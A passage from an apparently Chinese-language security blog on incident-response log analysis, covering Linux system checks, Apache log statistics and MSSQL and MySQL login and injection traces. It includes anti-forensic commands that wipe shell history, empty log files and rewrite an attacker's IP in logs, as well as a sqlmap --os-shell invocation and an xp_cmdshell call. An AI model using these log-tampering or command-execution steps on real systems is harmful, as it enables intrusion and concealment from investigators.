testfile</li></ul></li><li><p>删除历史操作记录，只保留前153行：</p><ul><li>sed -i ‘153,$d’ .bash_history</li></ul></li></ul><h3 id="0x04-linux系统状态检测"><a href="#0x04-linux系统状态检测" class="headerlink" title="0x04 linux系统状态检测"></a>0x04 linux系统状态检测</h3><h4 id="软件安装包"><a href="#软件安装包" class="headerlink" title="软件安装包"></a>软件安装包</h4><p>通过 rpm 自带的 -Va 来校验检查所有的 rpm 软件包，查看哪些命令是否被替换了</p><ul><li>rpm -Va &gt; rpm.log </li></ul><p>如果一切均校验正常将不会产生任何输出，如果有不一致的地方，就会显示出来，输出格式是8位长字符串，每个字符都用以表示文件与RPM数据库中一种属性的比较结果 ，如果是. (点) 则表示测试通过。 验证内容中的8个信息的具体内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">- S 文件大小是否改变 </span><br><span class="line">- M 文件的类型或文件的权限（rwx）是否被改变</span><br><span class="line">- 5 文件MD5校验是否改变（可以看成文件内容是否改变）</span><br><span class="line">- D 设备中，从代码是否改变 </span><br><span class="line">- L 文件路径是否改变 </span><br><span class="line">- U 文件的属主（所有者）是否改变 </span><br><span class="line">- G 文件的属组是否改变 </span><br><span class="line">- T 文件的修改时间是否改变</span><br></pre></td></tr></table></figure><h4 id="查看对外开放端口"><a href="#查看对外开放端口" class="headerlink" title="查看对外开放端口"></a>查看对外开放端口</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ss -tnlp</span><br><span class="line">ss -tnlp | grep ssh</span><br><span class="line">ss -tnlp | grep &quot;:22&quot;</span><br><span class="line">netstat -tnlp</span><br><span class="line">netstat -tnlp | grep ssh</span><br></pre></td></tr></table></figure><h4 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h4><ul><li><p>awk -F: ‘{if($3==0||$4==0)print $1}’ /etc/passwd </p><ul><li>查看 UID\GID 为0的帐号</li></ul></li><li><p>awk -F: ‘{if($7!=”/usr/sbin/nologin”)print $1}’ /etc/passwd </p><ul><li>查看能够登录的帐号</li></ul></li><li><p>lastlog</p><ul><li>系统中所有用户最近一次登录信息</li></ul></li><li><p>lastb </p><ul><li>显示用户错误的登录列表</li></ul></li><li><p>users </p><ul><li>打印当前登录的用户，每个用户名对应一个登录会话。如果一个用户不止一个登录会话，其用户名显示相同次数</li></ul></li></ul><h4 id="计划任务和启动项"><a href="#计划任务和启动项" class="headerlink" title="计划任务和启动项"></a>计划任务和启动项</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">没有安装</span><br><span class="line">chkconfig # 查看开机启动服务命令</span><br><span class="line">chkconfig --list | grep &quot;3:启用\|3:开\|3:on\|5:启用\|5:开\|5:on&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><p>ls /etc/init.d </p><ul><li>查看开机启动配置文件命令</li></ul></li><li><p>runlevel </p><ul><li>查看运行级别命令ls /etc/rc.d/rc[0~6].d </li></ul></li><li><p>crontab -l</p><ul><li> 计划任务列表</li></ul></li><li><p>ls -alh /var/spool/cron </p><ul><li>默认编写的 crontab 文件会保存在 /var/spool/cron/用户名 下</li></ul></li><li><p>ls -al /etc/ | grep cron</p></li><li><p>ls -al /etc/cron*</p></li><li><p>cat /etc/crontab#查看定时任务</p><ul><li>如：*/1 * * * * echo “hello world” &gt;&gt; /tmp/test.txt 每分钟写入文件</li></ul></li><li><p>cat /etc/anacrontab</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">crontab -l   列出某个用户cron服务的详细内容</span><br><span class="line">Tips：默认编写的crontab文件会保存在 (/var/spool/cron/用户名 例如: /var/spool/cron/root</span><br><span class="line">crontab -r   删除每个用户cront任务(谨慎：删除所有的计划任务)</span><br><span class="line">crontab -e   使用编辑器编辑当前的crontab文件 </span><br></pre></td></tr></table></figure><h4 id="可疑文件"><a href="#可疑文件" class="headerlink" title="可疑文件"></a>可疑文件</h4><p>查看敏感目录，如/tmp目录下的文件，同时注意隐藏文件夹，以“..”为名的文件夹具有隐藏属性，针对可疑文件查看创建修改时间。</p><ul><li><p>find / -ctime -2 # 查找48小时内新增的文件</p></li><li><p>find ./ -mtime 0 -name “*.jsp” # 查找24小时内被修改的 JSP 文件</p></li><li><p>find / *.jsp -perm 4777 # 查找777的权限的jsp文件</p></li><li><p>ls -a /tmp # 查看临时目录</p></li><li><p>strings /usr/sbin/sshd | egrep ‘[1-9]{1,3}.[1-9]{1,3}.’ # 分析 sshd 文件，是否包括IP信息</p></li></ul><h3 id="0x05-linux日志清理"><a href="#0x05-linux日志清理" class="headerlink" title="0x05 linux日志清理"></a>0x05 linux日志清理</h3><ul><li><p>历史命令</p><ul><li><p>histroy -r #删除当前会话历史记录</p></li><li><p>history -c #删除内存中的所有命令历史</p></li><li><p>rm .bash_history #删除历史文件中的内容zsh_history </p></li><li><p>HISTZISE=0 #通过设置历史命令条数来清除所有历史记录</p></li></ul></li><li><p>日志文件</p><ul><li><p>完全删除日志文件（下面任意一个即可）</p><ul><li><p>cat /dev/null &gt; filename</p></li><li><p>: &gt; filename &gt; filename </p></li><li><p>echo “” &gt; filename </p></li><li><p>echo &gt; filename</p></li></ul></li></ul></li><li><p>删除当天日志</p><ul><li>sed -i ‘/当天日期/‘d filename</li></ul></li><li><p>篡改日志</p><ul><li><p>将所有170.170.64.17ip替换为127.0.0.1</p></li><li><p>sed -i ‘s/170.170.64.17/127.0.0.1/g’</p></li></ul></li></ul><h2 id="Web日志分析"><a href="#Web日志分析" class="headerlink" title="Web日志分析"></a>Web日志分析</h2><h3 id="ox01-Web日志"><a href="#ox01-Web日志" class="headerlink" title="ox01  Web日志"></a>ox01  Web日志</h3><p>Web访问日志记录了Web服务器接收处理请求及运行时错误等各种原始信息。通过对WEB日志进行的安全分析，不仅可以帮助我们定位攻击者，还可以帮助我们还原攻击路径，找到网站存在的安全漏洞并进行修复。</p><p>我们来看一条Apache的访问日志：</p><p><code>127.0.0.1 - - [11/Jun/2018:12:47:22 +0800] &quot;GET /login.html HTTP/1.1&quot; 200 786 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36&quot;</code></p><p>通过这条Web访问日志，我们可以清楚的得知用户在什么IP、什么时间、用什么操作系统、什么浏览器的情况下访问了你网站的哪个页面，是否访问成功。</p><p>本文通过介绍Web日志安全分析时的思路和常用的一些技巧。</p><h3 id="0x02-日志分析技巧-1"><a href="#0x02-日志分析技巧-1" class="headerlink" title="0x02 日志分析技巧"></a>0x02 日志分析技巧</h3><p>在对WEB日志进行安全分析时，一般可以按照两种思路展开，逐步深入，还原整个攻击过程。</p><p>第一种：确定入侵的时间范围，以此为线索，查找这个时间范围内可疑的日志，进一步排查，最终确定攻击者，还原攻击过程。</p><p>第二种：攻击者在入侵网站后，通常会留下后门维持权限，以方便再次访问，我们可以找到该文件，并以此为线索来展开分析。</p><p>常用分析工具：</p><p>Window下，推荐用 EmEditor 进行日志分析，支持大文本，搜索效率还不错。</p><p>Linux下，使用Shell命令组合查询分析。</p><p>Shell+Linux命令实现日志分析，一般结合grep、awk等命令等实现了几个常用的日志分析统计技巧。</p><p>Apache日志分析技巧：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">1、列出当天访问次数最多的IP命令：</span><br><span class="line">cut -d- -f 1 log_file|uniq -c | sort -rn | head -20</span><br><span class="line"></span><br><span class="line">2、查看当天有多少个IP访问：</span><br><span class="line">awk &#x27;&#123;print $1&#125;&#x27; log_file|sort|uniq|wc -l</span><br><span class="line"></span><br><span class="line">3、查看某一个页面被访问的次数：</span><br><span class="line">grep &quot;/index.php&quot; log_file | wc -l</span><br><span class="line"></span><br><span class="line">4、查看每一个IP访问了多少个页面：</span><br><span class="line">awk &#x27;&#123;++S[$1]&#125; END &#123;for (a in S) print a,S[a]&#125;&#x27; log_file</span><br><span class="line"></span><br><span class="line">5、将每个IP访问的页面数进行从小到大排序：</span><br><span class="line">awk &#x27;&#123;++S[$1]&#125; END &#123;for (a in S) print S[a],a&#125;&#x27; log_file | sort -n</span><br><span class="line"></span><br><span class="line">6、查看某一个IP访问了哪些页面：</span><br><span class="line">grep ^111.111.111.111 log_file| awk &#x27;&#123;print $1,$7&#125;&#x27;</span><br><span class="line"></span><br><span class="line">7、去掉搜索引擎统计当天的页面：</span><br><span class="line">awk &#x27;&#123;print $12,$1&#125;&#x27; log_file | grep ^\&quot;Mozilla | awk &#x27;&#123;print $2&#125;&#x27; |sort | uniq | wc -l</span><br><span class="line"></span><br><span class="line">8、查看2018年6月21日14时这一个小时内有多少IP访问:</span><br><span class="line">awk &#x27;&#123;print $4,$1&#125;&#x27; log_file | grep 21/Jun/2018:14 | awk &#x27;&#123;print $2&#125;&#x27;| sort | uniq | wc -l</span><br></pre></td></tr></table></figure><h3 id="0x03-日志分析案例"><a href="#0x03-日志分析案例" class="headerlink" title="0x03 日志分析案例"></a>0x03 日志分析案例</h3><p>Web日志分析实例：通过nginx代理转发到内网某服务器，内网服务器某站点目录下被上传了多个图片木马，虽然II7下不能解析，但还是想找出谁通过什么路径上传的。</p><p>在这里，我们遇到了一个问题：由于设置了代理转发，只记录了代理服务器的ip，并没有记录访问者IP？这时候，如何去识别不同的访问者和攻击源呢？</p><p>这是管理员日志配置不当的问题，但好在我们可以通过浏览器指纹来定位不同的访问来源，还原攻击路径。</p><p>1、定位攻击源</p><p>首先访问图片木马的记录，只找到了一条，由于所有访问日志只记录了代理IP，并不能通过IP来还原攻击路径，这时候，可以利用浏览器指纹来定位。</p><p><img src="/image/media/2022/secops/log-3-1.png"></p><p>浏览器指纹：</p><p><code>Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/7.0;+SLCC2;+.NET+CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+.NET4.0C;+.NET4.0E)</code></p><p>2、搜索相关日志记录</p><p>通过筛选与该浏览器指纹有关的日志记录，可以清晰地看到攻击者的攻击路径。</p><p><img src="/image/media/2022/secops/log-3-2.png"></p><p>3、对找到的访问日志进行解读，攻击者大致的访问路径如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">A、攻击者访问首页和登录页</span><br><span class="line">B、攻击者访问MsgSjlb.aspx和MsgSebd.aspx</span><br><span class="line">C、攻击者访问Xzuser.aspx</span><br><span class="line">D、攻击者多次POST（怀疑通过这个页面上传模块缺陷）</span><br><span class="line">E、攻击者访问了图片木马</span><br></pre></td></tr></table></figure><p>打开网站，访问Xzuser.aspx，确认攻击者通过该页面的进行文件上传了图片木马，同时，发现网站了存在越权访问漏洞，攻击者访问特定URL，无需登录即可进入后台界面。通过日志分析找到网站的漏洞位置并进行修复。</p><h3 id="0x04-日志统计分析技巧"><a href="#0x04-日志统计分析技巧" class="headerlink" title="0x04 日志统计分析技巧"></a>0x04 日志统计分析技巧</h3><p>统计爬虫：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -E <span class="string">&#x27;Googlebot|Baiduspider&#x27;</span>  /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log | awk <span class="string">&#x27;&#123; print $1 &#125;&#x27;</span> | sort | uniq</span><br></pre></td></tr></table></figure><p>统计浏览器：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log | grep -v -E <span class="string">&#x27;MSIE|Firefox|Chrome|Opera|Safari|Gecko|Maxthon&#x27;</span> | sort | uniq -c | sort -r -n | head -n <span class="number">100</span></span><br></pre></td></tr></table></figure><p>IP 统计：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&#x27;23/May/2019&#x27;</span> /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | awk -F<span class="string">&#x27;.&#x27;</span> <span class="string">&#x27;&#123;print $1&quot;.&quot;$2&quot;.&quot;$3&quot;.&quot;$4&#125;&#x27;</span> | sort | uniq -c | sort -r -n | head -n <span class="number">10</span></span><br><span class="line">   <span class="number">2206</span> <span class="number">219.136</span><span class="number">.134</span><span class="number">.13</span></span><br><span class="line">   <span class="number">1497</span> <span class="number">182.34</span><span class="number">.15</span><span class="number">.248</span></span><br><span class="line">   <span class="number">1431</span> <span class="number">211.140</span><span class="number">.143</span><span class="number">.100</span></span><br><span class="line">   <span class="number">1431</span> <span class="number">119.145</span><span class="number">.149</span><span class="number">.106</span></span><br><span class="line">   <span class="number">1427</span> <span class="number">61.183</span><span class="number">.15</span><span class="number">.179</span></span><br><span class="line">   <span class="number">1427</span> <span class="number">218.6</span><span class="number">.8</span><span class="number">.189</span></span><br><span class="line">   <span class="number">1422</span> <span class="number">124.232</span><span class="number">.150</span><span class="number">.171</span></span><br><span class="line">   <span class="number">1421</span> <span class="number">106.187</span><span class="number">.47</span><span class="number">.224</span></span><br><span class="line">   <span class="number">1420</span> <span class="number">61.160</span><span class="number">.220</span><span class="number">.252</span></span><br><span class="line">   <span class="number">1418</span> <span class="number">114.80</span><span class="number">.201</span><span class="number">.18</span></span><br></pre></td></tr></table></figure><p>统计网段：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | awk -F<span class="string">&#x27;.&#x27;</span> <span class="string">&#x27;&#123;print $1&quot;.&quot;$2&quot;.&quot;$3&quot;.0&quot;&#125;&#x27;</span> | sort | uniq -c | sort -r -n | head -n <span class="number">200</span></span><br></pre></td></tr></table></figure><p>统计域名：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat  /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log |awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>|sort|uniq -c|sort -rn|more</span><br></pre></td></tr></table></figure><p>HTTP Status：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat  /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log |awk <span class="string">&#x27;&#123;print $9&#125;&#x27;</span>|sort|uniq -c|sort -rn|more</span><br><span class="line"><span class="number">5056585</span> <span class="number">304</span></span><br><span class="line"><span class="number">1125579</span> <span class="number">200</span></span><br><span class="line">   <span class="number">7602</span> <span class="number">400</span></span><br><span class="line">      <span class="number">5</span> <span class="number">301</span></span><br></pre></td></tr></table></figure><p>URL 统计：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat  /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log |awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span>|sort|uniq -c|sort -rn|more</span><br></pre></td></tr></table></figure><p>文件流量统计：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log |awk <span class="string">&#x27;&#123;sum[$7]+=$10&#125;END&#123;for(i in sum)&#123;print sum[i],i&#125;&#125;&#x27;</span>|sort -rn|more</span><br><span class="line"></span><br><span class="line">grep <span class="string">&#x27; 200 &#x27;</span> /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log |awk <span class="string">&#x27;&#123;sum[$7]+=$10&#125;END&#123;for(i in sum)&#123;print sum[i],i&#125;&#125;&#x27;</span>|sort -rn|more</span><br></pre></td></tr></table></figure><p>URL访问量统计：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | egrep <span class="string">&#x27;\?|&amp;&#x27;</span> | sort | uniq -c | sort -rn | more</span><br></pre></td></tr></table></figure><p>脚本运行速度：</p><p>查出运行速度最慢的脚本</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -v <span class="number">0</span>$ /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log | awk -F <span class="string">&#x27;\&quot; &#x27;</span> <span class="string">&#x27;&#123;print $4&quot; &quot; $1&#125;&#x27;</span> web.<span class="property">log</span> | awk <span class="string">&#x27;&#123;print $1&quot; &quot;$8&#125;&#x27;</span> | sort -n -k <span class="number">1</span> -r | uniq &gt; <span class="regexp">/tmp/</span>slow_url.<span class="property">txt</span></span><br></pre></td></tr></table></figure><p>IP, URL 抽取：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># tail -f /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log | grep <span class="string">&#x27;/test.html&#x27;</span> | awk <span class="string">&#x27;&#123;print $1&quot; &quot;$7&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="MSSQL日志分析"><a href="#MSSQL日志分析" class="headerlink" title="MSSQL日志分析"></a>MSSQL日志分析</h2><p>常见的数据库攻击包括弱口令、SQL注入、提升权限、窃取备份等。对数据库日志进行分析，可以发现攻击行为，进一步还原攻击场景及追溯攻击源。</p><h3 id="0x01-MSSQL日志分析"><a href="#0x01-MSSQL日志分析" class="headerlink" title="0x01 MSSQL日志分析"></a>0x01 MSSQL日志分析</h3><p>首先，MSSQL数据库应启用日志记录功能，默认配置仅限失败的登录，需修改为失败和成功的登录，这样就可以对用户登录进行审核。</p><p><img src="/image/media/2022/secops/log-4-3.png"></p><p>登录到SQL Server Management Studio，依次点击 管理–SQL Server 日志</p><p><img src="/image/media/2022/secops/log-4-4.png"></p><p>双击日志存档文件即可打开日志文件查看器，并可以对日志进行筛选或者导出等操作。</p><p><img src="/image/media/2022/secops/log-4-5.png"></p><p>另外，MSSQ提供了一个工具SQL Server Profiler ，方便查找和发现SQL执行的效率和语句问题。</p><p><img src="/image/media/2022/secops/log-4-6.png"></p><p>日志分析案例：</p><p>在日志文件查看器中，选择筛选，在筛选设置中源设置为“登录”，应用筛选器，确定。</p><p><img src="/image/media/2022/secops/log-4-7.png"></p><p>筛选后的结果，可以很清晰的识别用户登录信息，记录内容包括用户登录时间、登录是否成功、登录使用的账号以及远程登录时用户使用的IP地址。</p><p>如下图：客户端：192.168.204.1进行尝试弱口令登录，并发现其中有一条登录成功的记录。</p><p><img src="/image/media/2022/secops/log-4-8.png"></p><h3 id="0x02-SQL注入入侵痕迹"><a href="#0x02-SQL注入入侵痕迹" class="headerlink" title="0x02  SQL注入入侵痕迹"></a>0x02  SQL注入入侵痕迹</h3><p>在利用SQL注入漏洞的过程中，我们会尝试利用sqlmap的–os-shell参数取得shell，如操作不慎，可能留下一些sqlmap创建的临时表和自定义函数。我们先来看一下sqlmap os-shell参数的用法以及原理：</p><p>1、构造一个SQL注入点，开启Burp监听8080端口</p><p><code>sqlmap.py  -u http://192.168.204.164/sql.asp?id=1 --os-shell --proxy=http://127.0.0.1:8080</code></p><p>HTTP通讯过程如下：</p><p><img src="C:/Users/Bypass/Desktop/Mybook/LogAnalysis/image/log-4-1.png"></p><p>创建了一个临时表sqlmapoutput，调用存储过程执行系统命令将数据写入临时表，然后取临时表中的数据展示到前端。</p><p>通过查看数据库中最近新建的表的结构和内容，可以判断是否发生过sql注入漏洞攻击事件。</p><p>检查方法：</p><p>1、数据库表检查</p><p><img src="C:/Users/Bypass/Desktop/Mybook/LogAnalysis/image/log-4-2.png"></p><p>2、检查xp_cmdshell等存储过程</p><p>xp_cmdshell在mssql2005之后的版本中是默认禁止的，查看xp_cmdshell是否被启用。</p><p>`Exec master.dbo.xp_cmdshell ‘whoami’</p><p>3、需要结合web日志，通过查看日志文件的大小以及审计日志文件中的内容，可以判断是否发生过sql注入漏洞攻击事件。</p><h2 id="MySQL日志分析"><a href="#MySQL日志分析" class="headerlink" title="MySQL日志分析"></a>MySQL日志分析</h2><p>常见的数据库攻击包括弱口令、SQL注入、提升权限、窃取备份等。对数据库日志进行分析，可以发现攻击行为，进一步还原攻击场景及追溯攻击源。</p><h3 id="0x01-Mysql日志分析"><a href="#0x01-Mysql日志分析" class="headerlink" title="0x01 Mysql日志分析"></a>0x01 Mysql日志分析</h3><p>general query log能记录成功连接和每次执行的查询，我们可以将它用作安全布防的一部分，为故障分析或黑客事件后的调查提供依据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1、查看log配置信息</span><br><span class="line">show variables like &#x27;%general%&#x27;;</span><br><span class="line">2、开启日志</span><br><span class="line">SET GLOBAL general_log = &#x27;On&#x27;;</span><br><span class="line">3、指定日志文件路径</span><br><span class="line">#SET GLOBAL general_log_file = &#x27;/var/lib/mysql/mysql.log&#x27;;</span><br></pre></td></tr></table></figure><p>比如，当我访问 /test.php?id=1，此时我们得到这样的日志：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">190604 14:46:14       14 Connect    root@localhost on </span><br><span class="line">           14 Init DB    test</span><br><span class="line">           14 Query    SELECT * FROM admin WHERE id = 1</span><br><span class="line">           14 Quit  `</span><br></pre></td></tr></table></figure><p>我们按列来解析一下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">第一列:Time，时间列，前面一个是日期,后面一个是小时和分钟，有一些不显示的原因是因为这些sql语句几乎是同时执行的,所以就不另外记录时间了。</span><br><span class="line">第二列:Id，就是show processlist出来的第一列的线程ID,对于长连接和一些比较耗时的sql语句,你可以精确找出究竟是那一条那一个线程在运行。</span><br><span class="line">第三列:Command，操作类型，比如Connect就是连接数据库，Query就是查询数据库(增删查改都显示为查询)，可以特定过虑一些操作。</span><br><span class="line">第四列:Argument，详细信息，例如 Connect    root@localhost on 意思就是连接数据库，如此类推,接下面的连上数据库之后,做了什么查询的操作。</span><br></pre></td></tr></table></figure><h3 id="0x02-登录成功-失败"><a href="#0x02-登录成功-失败" class="headerlink" title="0x02 登录成功/失败"></a>0x02 登录成功/失败</h3><p>我们来做个简单的测试吧，使用我以前自己开发的弱口令工具来扫一下，字典设置比较小，2个用户，4个密码，共8组。</p><p><img src="/image/media/2022/secops/log-5-1.png"></p><p>MySQL中的log记录是这样子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Time                 Id        Command         Argument</span><br><span class="line"></span><br><span class="line">190601 22:03:20   98 Connectroot@192.168.204.1 on </span><br><span class="line">   98 ConnectAccess denied for user &#x27;root&#x27;@&#x27;192.168.204.1&#x27; (using password: YES)</span><br><span class="line">  103 Connectmysql@192.168.204.1 on </span><br><span class="line">  103 ConnectAccess denied for user &#x27;mysql&#x27;@&#x27;192.168.204.1&#x27; (using password: YES)</span><br><span class="line">  104 Connectmysql@192.168.204.1 on </span><br><span class="line">  104 ConnectAccess denied for user &#x27;mysql&#x27;@&#x27;192.168.204.1&#x27; (using password: YES)</span><br><span class="line">  100 Connectroot@192.168.204.1 on </span><br><span class="line">  101 Connectroot@192.168.204.1 on </span><br><span class="line">  101 ConnectAccess denied for user &#x27;root&#x27;@&#x27;192.168.204.1&#x27; (using password: YES)</span><br><span class="line">   99 Connectroot@192.168.204.1 on </span><br><span class="line">   99 ConnectAccess denied for user &#x27;root&#x27;@&#x27;192.168.204.1&#x27; (using password: YES)</span><br><span class="line">  105 Connectmysql@192.168.204.1 on </span><br><span class="line">  105 ConnectAccess denied for user &#x27;mysql&#x27;@&#x27;192.168.204.1&#x27; (using password: YES)</span><br><span class="line">  100 Queryset autocommit=0</span><br><span class="line">  102 Connectmysql@192.168.204.1 on </span><br><span class="line">  102 ConnectAccess denied for user &#x27;mysql&#x27;@&#x27;192.168.204.1&#x27; (using password: YES)</span><br><span class="line">  100 Quit`</span><br></pre></td></tr></table></figure><p>你知道在这个口令猜解过程中，哪个是成功的吗？</p><p>利用爆破工具，一个口令猜解成功的记录是这样子的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">190601 22:03:20     100 Connectroot@192.168.204.1 on </span><br><span class="line">   100 Queryset autocommit=0</span><br><span class="line">   100 Quit</span><br></pre></td></tr></table></figure><p>但是，如果你是用其他方式，可能会有一点点不一样的哦。</p><p>Navicat for MySQL登录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">190601 22:14:07  106 Connectroot@192.168.204.1 on </span><br><span class="line">         106 QuerySET NAMES utf8</span><br><span class="line">         106 QuerySHOW VARIABLES LIKE &#x27;lower_case_%&#x27;</span><br><span class="line">         106 QuerySHOW VARIABLES LIKE &#x27;profiling&#x27;</span><br><span class="line">         106 QuerySHOW DATABASES</span><br></pre></td></tr></table></figure><p>命令行登录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">190601 22:17:25  111 Connectroot@localhost on </span><br><span class="line">         111 Queryselect @@version_comment limit 1</span><br><span class="line">190601 22:17:56  111 Quit</span><br></pre></td></tr></table></figure><p>这个差别在于，不同的数据库连接工具，它在连接数据库初始化的过程中是不同的。通过这样的差别，我们可以简单判断出用户是通过连接数据库的方式。</p><p>另外，不管你是爆破工具、Navicat for MySQL、还是命令行，登录失败都是一样的记录。</p><p>登录失败的记录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">102 Connectmysql@192.168.204.1 on </span><br><span class="line">102 ConnectAccess denied for user &#x27;mysql&#x27;@&#x27;192.168.204.1&#x27; (using password: YES)</span><br></pre></td></tr></table></figure><p>利用shell命令进行简单的分析：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#有哪些IP在爆破？</span><br><span class="line">grep  &quot;Access denied&quot; mysql.log |cut -d &quot;&#x27;&quot; -f4|uniq -c|sort -nr</span><br><span class="line">     27 192.168.204.1</span><br><span class="line"></span><br><span class="line">#爆破用户名字典都有哪些？</span><br><span class="line">grep  &quot;Access denied&quot; mysql.log |cut -d &quot;&#x27;&quot; -f2|uniq -c|sort 